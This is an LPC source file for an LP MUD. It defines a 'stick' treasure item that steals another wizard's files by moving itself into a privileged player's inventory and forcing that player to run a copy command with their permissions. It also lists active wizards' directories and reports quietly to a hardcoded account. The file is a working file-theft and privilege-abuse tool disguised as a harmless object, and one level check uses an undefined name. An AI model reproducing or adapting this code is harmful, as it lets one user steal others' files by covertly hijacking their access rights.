inherit "/obj/treasure";
#define WIZ 51
#define rwiz "rumplemintz"
#define renegade me->query_real_name()

object me,them;
string path1,path2;

reset(arg) { set_id("stick"); }

init() {
  ::init();
  me=find_player(rwiz);
  add_action("rhelp","rhelp");
  add_action("rsteal","rsteal");
  add_action("copy_file","loki");
  add_action("what_dir","dirs");
}

rhelp() {
  write("rhelp         This message\n");
  write("rsteal        steal file\n");
  write("dirs          wizards and their current directories\n");
  return 1;
}

rsteal(str) {
  string source,dest;
  if (!str) { write("Usage: rsteal <source> <destination>\n"); return 0; }
  if (sscanf(str,"%s %s",source,dest)==2) {
    if (source) guinea(source);
    else { write("No source specified.\n"); return 0; }
    path1=source;
    if (dest) path2="/players/"+renegade+"/open/"+dest;
    else { write("No destination specified.\n"); return 0; }
    if (them) {
      tell_object(me,them->query_name()+" is the guinea pig !\n");
      move_object(this_object(),them);
      command("loki",them);
    } else tell_object(me,"No available guinea pig.\n");
    return 1;
  }
  return 1;
}

copy_file() { 
  if (cp (path1,path2)) tell_object(me,"Consider it done ....\n");
  else tell_object(me,"Forget it ....\n");
  destruct(this_object());
  return 1;
}

guinea(path) {
  string owner,shit;
  object ob;
  int i;
  ob=users();
  if (sscanf(path,"/players/%s/%s",owner,shit)==2) {
    for (i=0;i<sizeof(ob);i++)
      if ((ob[i]->query_real_name()==owner) || (ob[i]->query_level() > wiz))
        them=ob[i];
    return 1;
  }
  return 1;
}

what_dir() {
  object *usr;
  int i;
  usr=users();
  for (i=0;i<sizeof(usr);i++)
  if (usr[i]->query_level() >= WIZ)
    write(usr[i]->query_real_name()+"  "+usr[i]->query_path()+".\n");
  return 1;
}

